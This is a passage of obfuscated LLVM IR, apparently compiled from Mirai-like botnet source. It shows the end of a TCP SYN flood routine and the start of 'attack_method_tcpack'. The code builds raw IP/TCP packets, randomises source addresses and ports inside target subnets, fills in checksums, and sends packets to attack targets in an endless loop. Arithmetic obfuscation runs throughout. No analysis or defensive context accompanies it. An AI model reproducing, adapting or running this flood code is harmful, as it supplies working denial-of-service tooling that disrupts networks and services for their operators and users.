  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 -74, -1
  %137 = or i8 %134, %135
  %138 = or i8 -74, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = and i8 %140, 64
  %143 = xor i8 %140, 64
  %144 = or i8 %142, %143
  %145 = or i8 %140, 64
  store i8 %144, i8* %132, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = xor i8 %148, -1
  %150 = xor i8 -16, -1
  %151 = xor i8 -63, -1
  %152 = or i8 %149, %150
  %153 = or i8 -63, %151
  %154 = xor i8 %152, -1
  %155 = and i8 %154, %153
  %156 = and i8 %148, -16
  %157 = and i8 %155, 5
  %158 = xor i8 %155, 5
  %159 = or i8 %157, %158
  %160 = or i8 %155, 5
  store i8 %159, i8* %147, align 4
  %161 = load i8, i8* %12, align 1
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 1
  store i8 %161, i8* %163, align 1
  %164 = call zeroext i16 @htons(i16 zeroext 60) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 2
  store i16 %164, i16* %166, align 2
  %167 = load i16, i16* %13, align 2
  %168 = call zeroext i16 @htons(i16 zeroext %167) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 3
  store i16 %168, i16* %170, align 4
  %171 = load i8, i8* %14, align 1
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 5
  store i8 %171, i8* %173, align 4
  %174 = load i8, i8* %15, align 1
  %175 = icmp ne i8 %174, 0
  br i1 %175, label %176, label %180

; <label>:176:                                    ; preds = %113
  %177 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %178 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 4
  store i16 %177, i16* %179, align 2
  br label %180

; <label>:180:                                    ; preds = %176, %113
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 6
  store i8 6, i8* %182, align 1
  %183 = load i32, i32* %26, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 8
  store i32 %183, i32* %185, align 4
  %186 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 1
  %191 = load i32, i32* %190, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 9
  store i32 %191, i32* %193, align 4
  %194 = load i16, i16* %16, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 4
  %198 = load i16, i16* %17, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = load i32, i32* %18, align 4
  %203 = trunc i32 %202 to i16
  %204 = call zeroext i16 @htons(i16 zeroext %203) #7
  %205 = zext i16 %204 to i32
  %206 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 2
  store i32 %205, i32* %207, align 4
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = xor i16 -241, -1
  %212 = xor i16 %210, %211
  %213 = and i16 %212, %210
  %214 = and i16 %210, -241
  %215 = xor i16 %213, -1
  %216 = xor i16 160, -1
  %217 = xor i16 -14424, -1
  %218 = and i16 %215, -14424
  %219 = and i16 %213, %217
  %220 = and i16 %216, -14424
  %221 = and i16 160, %217
  %222 = or i16 %218, %219
  %223 = or i16 %220, %221
  %224 = xor i16 %222, %223
  %225 = or i16 %215, %216
  %226 = xor i16 %225, -1
  %227 = or i16 -14424, %217
  %228 = and i16 %226, %227
  %229 = or i16 %224, %228
  %230 = or i16 %213, 160
  store i16 %229, i16* %209, align 4
  %231 = load i8, i8* %20, align 1
  %232 = sext i8 %231 to i16
  %233 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = xor i16 1, -1
  %237 = xor i16 %232, %236
  %238 = and i16 %237, %232
  %239 = and i16 %232, 1
  %240 = shl i16 %238, 13
  %241 = xor i16 -8193, -1
  %242 = xor i16 %235, %241
  %243 = and i16 %242, %235
  %244 = and i16 %235, -8193
  %245 = and i16 %243, %240
  %246 = xor i16 %243, %240
  %247 = or i16 %245, %246
  %248 = or i16 %243, %240
  store i16 %247, i16* %234, align 4
  %249 = load i8, i8* %21, align 1
  %250 = sext i8 %249 to i16
  %251 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 4
  %253 = load i16, i16* %252, align 4
  %254 = xor i16 1, -1
  %255 = xor i16 %250, %254
  %256 = and i16 %255, %250
  %257 = and i16 %250, 1
  %258 = shl i16 %256, 12
  %259 = xor i16 -4097, -1
  %260 = xor i16 %253, %259
  %261 = and i16 %260, %253
  %262 = and i16 %253, -4097
  %263 = and i16 %261, %258
  %264 = xor i16 %261, %258
  %265 = or i16 %263, %264
  %266 = or i16 %261, %258
  store i16 %265, i16* %252, align 4
  %267 = load i8, i8* %22, align 1
  %268 = sext i8 %267 to i16
  %269 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = xor i16 %268, -1
  %273 = xor i16 1, -1
  %274 = xor i16 -20875, -1
  %275 = or i16 %272, %273
  %276 = or i16 -20875, %274
  %277 = xor i16 %275, -1
  %278 = and i16 %277, %276
  %279 = and i16 %268, 1
  %280 = shl i16 %278, 11
  %281 = xor i16 -2049, -1
  %282 = xor i16 %271, %281
  %283 = and i16 %282, %271
  %284 = and i16 %271, -2049
  %285 = and i16 %283, %280
  %286 = xor i16 %283, %280
  %287 = or i16 %285, %286
  %288 = or i16 %283, %280
  store i16 %287, i16* %270, align 4
  %289 = load i8, i8* %23, align 1
  %290 = sext i8 %289 to i16
  %291 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 4
  %293 = load i16, i16* %292, align 4
  %294 = xor i16 1, -1
  %295 = xor i16 %290, %294
  %296 = and i16 %295, %290
  %297 = and i16 %290, 1
  %298 = shl i16 %296, 10
  %299 = xor i16 -1025, -1
  %300 = xor i16 %293, %299
  %301 = and i16 %300, %293
  %302 = and i16 %293, -1025
  %303 = and i16 %301, %298
  %304 = xor i16 %301, %298
  %305 = or i16 %303, %304
  %306 = or i16 %301, %298
  store i16 %305, i16* %292, align 4
  %307 = load i8, i8* %24, align 1
  %308 = sext i8 %307 to i16
  %309 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 4
  %311 = load i16, i16* %310, align 4
  %312 = xor i16 1, -1
  %313 = xor i16 %308, %312
  %314 = and i16 %313, %308
  %315 = and i16 %308, 1
  %316 = shl i16 %314, 9
  %317 = xor i16 %311, -1
  %318 = xor i16 -513, -1
  %319 = xor i16 -21304, -1
  %320 = or i16 %317, %318
  %321 = or i16 -21304, %319
  %322 = xor i16 %320, -1
  %323 = and i16 %322, %321
  %324 = and i16 %311, -513
  %325 = xor i16 %323, -1
  %326 = xor i16 %316, -1
  %327 = xor i16 16765, -1
  %328 = and i16 %325, 16765
  %329 = and i16 %323, %327
  %330 = and i16 %326, 16765
  %331 = and i16 %316, %327
  %332 = or i16 %328, %329
  %333 = or i16 %330, %331
  %334 = xor i16 %332, %333
  %335 = or i16 %325, %326
  %336 = xor i16 %335, -1
  %337 = or i16 16765, %327
  %338 = and i16 %336, %337
  %339 = or i16 %334, %338
  %340 = or i16 %323, %316
  store i16 %339, i16* %310, align 4
  %341 = load i8, i8* %25, align 1
  %342 = sext i8 %341 to i16
  %343 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %344 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %343, i32 0, i32 4
  %345 = load i16, i16* %344, align 4
  %346 = xor i16 1, -1
  %347 = xor i16 %342, %346
  %348 = and i16 %347, %342
  %349 = and i16 %342, 1
  %350 = shl i16 %348, 8
  %351 = xor i16 %345, -1
  %352 = xor i16 -257, -1
  %353 = xor i16 8933, -1
  %354 = or i16 %351, %352
  %355 = or i16 8933, %353
  %356 = xor i16 %354, -1
  %357 = and i16 %356, %355
  %358 = and i16 %345, -257
  %359 = and i16 %357, %350
  %360 = xor i16 %357, %350
  %361 = or i16 %359, %360
  %362 = or i16 %357, %350
  store i16 %361, i16* %344, align 4
  %363 = load i8*, i8** %29, align 8
  %364 = getelementptr inbounds i8, i8* %363, i32 1
  store i8* %364, i8** %29, align 8
  store i8 2, i8* %363, align 1
  %365 = load i8*, i8** %29, align 8
  %366 = getelementptr inbounds i8, i8* %365, i32 1
  store i8* %366, i8** %29, align 8
  store i8 4, i8* %365, align 1
  %367 = call i32 @rand_next()
  %368 = xor i32 15, -1
  %369 = xor i32 %367, %368
  %370 = and i32 %369, %367
  %371 = and i32 %367, 15
  %372 = sub i32 0, %370
  %373 = sub i32 1400, %372
  %374 = add i32 1400, %370
  %375 = trunc i32 %373 to i16
  %376 = call zeroext i16 @htons(i16 zeroext %375) #7
  %377 = load i8*, i8** %29, align 8
  %378 = bitcast i8* %377 to i16*
  store i16 %376, i16* %378, align 2
  %379 = load i8*, i8** %29, align 8
  %380 = getelementptr inbounds i8, i8* %379, i64 2
  store i8* %380, i8** %29, align 8
  %381 = load i8*, i8** %29, align 8
  %382 = getelementptr inbounds i8, i8* %381, i32 1
  store i8* %382, i8** %29, align 8
  store i8 4, i8* %381, align 1
  %383 = load i8*, i8** %29, align 8
  %384 = getelementptr inbounds i8, i8* %383, i32 1
  store i8* %384, i8** %29, align 8
  store i8 2, i8* %383, align 1
  %385 = load i8*, i8** %29, align 8
  %386 = getelementptr inbounds i8, i8* %385, i32 1
  store i8* %386, i8** %29, align 8
  store i8 8, i8* %385, align 1
  %387 = load i8*, i8** %29, align 8
  %388 = getelementptr inbounds i8, i8* %387, i32 1
  store i8* %388, i8** %29, align 8
  store i8 10, i8* %387, align 1
  %389 = call i32 @rand_next()
  %390 = load i8*, i8** %29, align 8
  %391 = bitcast i8* %390 to i32*
  store i32 %389, i32* %391, align 4
  %392 = load i8*, i8** %29, align 8
  %393 = getelementptr inbounds i8, i8* %392, i64 4
  store i8* %393, i8** %29, align 8
  %394 = load i8*, i8** %29, align 8
  %395 = bitcast i8* %394 to i32*
  store i32 0, i32* %395, align 4
  %396 = load i8*, i8** %29, align 8
  %397 = getelementptr inbounds i8, i8* %396, i64 4
  store i8* %397, i8** %29, align 8
  %398 = load i8*, i8** %29, align 8
  %399 = getelementptr inbounds i8, i8* %398, i32 1
  store i8* %399, i8** %29, align 8
  store i8 1, i8* %398, align 1
  %400 = load i8*, i8** %29, align 8
  %401 = getelementptr inbounds i8, i8* %400, i32 1
  store i8* %401, i8** %29, align 8
  store i8 3, i8* %400, align 1
  %402 = load i8*, i8** %29, align 8
  %403 = getelementptr inbounds i8, i8* %402, i32 1
  store i8* %403, i8** %29, align 8
  store i8 3, i8* %402, align 1
  %404 = load i8*, i8** %29, align 8
  %405 = getelementptr inbounds i8, i8* %404, i32 1
  store i8* %405, i8** %29, align 8
  store i8 6, i8* %404, align 1
  br label %406

; <label>:406:                                    ; preds = %180
  %407 = load i32, i32* %9, align 4
  %408 = sub i32 0, %407
  %409 = sub i32 0, 1
  %410 = add i32 %408, %409
  %411 = sub i32 0, %410
  %412 = add nsw i32 %407, 1
  store i32 %411, i32* %9, align 4
  br label %108

; <label>:413:                                    ; preds = %108
  br label %414

; <label>:414:                                    ; preds = %582, %413
  store i32 0, i32* %9, align 4
  br label %415

; <label>:415:                                    ; preds = %577, %414
  %416 = load i32, i32* %9, align 4
  %417 = load i8, i8* %5, align 1
  %418 = zext i8 %417 to i32
  %419 = icmp slt i32 %416, %418
  br i1 %419, label %420, label %582

; <label>:420:                                    ; preds = %415
  %421 = load i8**, i8*** %11, align 8
  %422 = load i32, i32* %9, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds i8*, i8** %421, i64 %423
  %425 = load i8*, i8** %424, align 8
  store i8* %425, i8** %30, align 8
  %426 = load i8*, i8** %30, align 8
  %427 = bitcast i8* %426 to %struct.iphdr*
  store %struct.iphdr* %427, %struct.iphdr** %31, align 8
  %428 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i64 1
  %430 = bitcast %struct.iphdr* %429 to %struct.tcphdr*
  store %struct.tcphdr* %430, %struct.tcphdr** %32, align 8
  %431 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %432 = load i32, i32* %9, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 2
  %436 = load i8, i8* %435, align 4
  %437 = zext i8 %436 to i32
  %438 = icmp slt i32 %437, 32
  br i1 %438, label %439, label %463

; <label>:439:                                    ; preds = %420
  %440 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %441 = load i32, i32* %9, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i32 0, i32 1
  %445 = load i32, i32* %444, align 4
  %446 = call i32 @ntohl(i32 %445) #7
  %447 = call i32 @rand_next()
  %448 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %449 = load i32, i32* %9, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i64 %450
  %452 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %451, i32 0, i32 2
  %453 = load i8, i8* %452, align 4
  %454 = zext i8 %453 to i32
  %455 = lshr i32 %447, %454
  %456 = add i32 %446, -440778715
  %457 = add i32 %456, %455
  %458 = sub i32 %457, -440778715
  %459 = add i32 %446, %455
  %460 = call i32 @htonl(i32 %458) #7
  %461 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 9
  store i32 %460, i32* %462, align 4
  br label %463

; <label>:463:                                    ; preds = %439, %420
  %464 = load i32, i32* %26, align 4
  %465 = icmp eq i32 %464, -1
  br i1 %465, label %466, label %470

; <label>:466:                                    ; preds = %463
  %467 = call i32 @rand_next()
  %468 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %468, i32 0, i32 8
  store i32 %467, i32* %469, align 4
  br label %470

; <label>:470:                                    ; preds = %466, %463
  %471 = load i16, i16* %13, align 2
  %472 = zext i16 %471 to i32
  %473 = icmp eq i32 %472, 65535
  br i1 %473, label %474, label %483

; <label>:474:                                    ; preds = %470
  %475 = call i32 @rand_next()
  %476 = xor i32 65535, -1
  %477 = xor i32 %475, %476
  %478 = and i32 %477, %475
  %479 = and i32 %475, 65535
  %480 = trunc i32 %478 to i16
  %481 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 3
  store i16 %480, i16* %482, align 4
  br label %483

; <label>:483:                                    ; preds = %474, %470
  %484 = load i16, i16* %16, align 2
  %485 = zext i16 %484 to i32
  %486 = icmp eq i32 %485, 65535
  br i1 %486, label %487, label %500

; <label>:487:                                    ; preds = %483
  %488 = call i32 @rand_next()
  %489 = xor i32 %488, -1
  %490 = xor i32 65535, -1
  %491 = xor i32 -884976097, -1
  %492 = or i32 %489, %490
  %493 = or i32 -884976097, %491
  %494 = xor i32 %492, -1
  %495 = and i32 %494, %493
  %496 = and i32 %488, 65535
  %497 = trunc i32 %495 to i16
  %498 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %499 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %498, i32 0, i32 0
  store i16 %497, i16* %499, align 4
  br label %500

; <label>:500:                                    ; preds = %487, %483
  %501 = load i16, i16* %17, align 2
  %502 = zext i16 %501 to i32
  %503 = icmp eq i32 %502, 65535
  br i1 %503, label %504, label %513

; <label>:504:                                    ; preds = %500
  %505 = call i32 @rand_next()
  %506 = xor i32 65535, -1
  %507 = xor i32 %505, %506
  %508 = and i32 %507, %505
  %509 = and i32 %505, 65535
  %510 = trunc i32 %508 to i16
  %511 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %512 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %511, i32 0, i32 1
  store i16 %510, i16* %512, align 2
  br label %513

; <label>:513:                                    ; preds = %504, %500
  %514 = load i32, i32* %18, align 4
  %515 = icmp eq i32 %514, 65535
  br i1 %515, label %516, label %520

; <label>:516:                                    ; preds = %513
  %517 = call i32 @rand_next()
  %518 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %519 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %518, i32 0, i32 2
  store i32 %517, i32* %519, align 4
  br label %520

; <label>:520:                                    ; preds = %516, %513
  %521 = load i32, i32* %19, align 4
  %522 = icmp eq i32 %521, 65535
  br i1 %522, label %523, label %527

; <label>:523:                                    ; preds = %520
  %524 = call i32 @rand_next()
  %525 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %526 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %525, i32 0, i32 3
  store i32 %524, i32* %526, align 4
  br label %527

; <label>:527:                                    ; preds = %523, %520
  %528 = load i8, i8* %20, align 1
  %529 = icmp ne i8 %528, 0
  br i1 %529, label %530, label %539

; <label>:530:                                    ; preds = %527
  %531 = call i32 @rand_next()
  %532 = xor i32 65535, -1
  %533 = xor i32 %531, %532
  %534 = and i32 %533, %531
  %535 = and i32 %531, 65535
  %536 = trunc i32 %534 to i16
  %537 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %538 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  br label %539

; <label>:539:                                    ; preds = %530, %527
  %540 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %541 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %540, i32 0, i32 7
  store i16 0, i16* %541, align 2
  %542 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %543 = bitcast %struct.iphdr* %542 to i16*
  %544 = call zeroext i16 @checksum_generic(i16* %543, i32 20)
  %545 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %546 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %545, i32 0, i32 7
  store i16 %544, i16* %546, align 2
  %547 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 6
  store i16 0, i16* %548, align 4
  %549 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %550 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %551 = bitcast %struct.tcphdr* %550 to i8*
  %552 = call zeroext i16 @htons(i16 zeroext 40) #7
  %553 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %549, i8* %551, i16 zeroext %552, i32 40)
  %554 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 6
  store i16 %553, i16* %555, align 4
  %556 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 1
  %558 = load i16, i16* %557, align 2
  %559 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %560 = load i32, i32* %9, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %559, i64 %561
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i32 0, i32 0
  %564 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %563, i32 0, i32 1
  store i16 %558, i16* %564, align 2
  %565 = load i32, i32* %10, align 4
  %566 = load i8*, i8** %30, align 8
  %567 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %568 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %569 = load i32, i32* %9, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %568, i64 %570
  %572 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i32 0, i32 0
  %573 = bitcast %struct.sockaddr_in* %572 to %struct.sockaddr*
  store %struct.sockaddr* %573, %struct.sockaddr** %567, align 8
  %574 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %575 = load %struct.sockaddr*, %struct.sockaddr** %574, align 8
  %576 = call i64 @sendto(i32 %565, i8* %566, i64 60, i32 16384, %struct.sockaddr* %575, i32 16)
  br label %577

; <label>:577:                                    ; preds = %539
  %578 = load i32, i32* %9, align 4
  %579 = sub i32 0, 1
  %580 = sub i32 %578, %579
  %581 = add nsw i32 %578, 1
  store i32 %580, i32* %9, align 4
  br label %415

; <label>:582:                                    ; preds = %415
  br label %414

; <label>:583:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
